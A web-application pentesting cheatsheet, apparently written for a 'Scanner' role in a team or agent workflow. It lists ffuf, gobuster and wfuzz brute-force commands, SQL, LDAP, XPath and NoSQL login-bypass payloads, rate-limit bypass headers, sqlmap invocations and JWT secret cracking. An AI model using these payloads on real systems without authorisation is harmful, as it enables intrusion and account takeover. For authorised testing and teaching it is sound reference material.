# Web Fuzzing, Directory BF & Login Bypass — Scanner Cheatsheet

## Directory / file brute-force (rate-limit with -rate / -t)
```bash
ffuf -u <URL>/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate 50 -mc 200,204,301,302,307,401,403
ffuf -u <URL>/FUZZ -w directory-list-2.3-medium.txt -recursion -rate 30
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/big.txt -t 20 -x php,html,txt,bak,zip,conf
dirsearch -u <URL> -e php,asp,aspx,jsp,html,js,json -t 20
wfuzz -c -z file,common.txt --hc 404 <URL>/FUZZ
```
Wordlists: dirb/common.txt, dirb/big.txt, directory-list-2.3-medium.txt, raft-*, assetnote.
Extensions to add: `php,txt,conf,bak,old,zip,tar.gz,sql,log,env,ini`.

## WFuzz recipes
```bash
# hide/show by code, words, lines, regex
wfuzz -c -w wl.txt --hc 404 <URL>/FUZZ
wfuzz -c -w wl.txt --ss "Welcome" <URL>/login      # show matching body
wfuzz -c -w users.txt -w pass.txt -m zip -d 'user=FUZZ&pass=FUZ2Z' <URL>/login   # paired lists
wfuzz -c -w wl.txt -H "Host: FUZZ.<domain>" --hc 400,404 <URL>     # vhost fuzz
wfuzz -c -w params.txt -u <URL>?FUZZ=1              # param discovery
wfuzz -c -w wl.txt -b "cookie=x" <URL>/FUZZ
```
ffuf equivalents: `-H "Host: FUZZ.example.com"`, `-w wl.txt:FUZZ`, `-fs/-fc/-fw/-fl` filters.

## Parameter discovery
Arjun: `arjun -u <URL>/endpoint` ; or wfuzz with params wordlist against known endpoints.

## Login-bypass payloads (feed into password/user fields; sqlmap is better for SQLi)
SQL auth bypass (try as username AND password):
```
' or '1'='1        " or "1"="1        ' or ''='        or true--
') or ('x')=('x    admin'--           ' or 1=1#        ") or ("x")=("x
' or 'x'='x        ' UNION SELECT 1-- ' or benchmark(...)
```
LDAP auth bypass: `*`, `*)(&`, `*)(|(&`, `admin)(&)`, `*))%00`.
XPath: `' or '1'='1`, `' or true() or '`.
Node/JSON object-injection bypass: send `password[$ne]=x` or `{"password":{"$ne":null}}`.

## Rate-limit bypass probes (flag, don't abuse)
- Add headers: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Originating-IP`.
- Try `X-Forwarded-For` rotation.
- HTTP method/parameter pollution; trailing `/`, `%2e`.
- GraphQL aliases batch; REST bulk endpoints.
- WebSocket/gRPC variants of same endpoint.
(CAPTCHA: out of scope for Scanner; note presence for Exploit.)

## SQLi quick-detection (hand confirmed vulns to Exploit/sqlmap)
```bash
sqlmap -u "<URL>?id=1" --batch --level=1 --risk=1 --technique=BEUSTQ --threads=4
```
NEVER `--os-shell`, `--risk=3`, `--level=5` without Captain. Add `--cookie` if auth needed.
For POST: `sqlmap -u "<URL>" --data="user=a&pass=b" -p user --batch`.

## JWT / token quick checks
`jwt_tool.py <token>` ; `hashcat -m 16500` for weak HS256 secrets. alg:none test → Exploit.
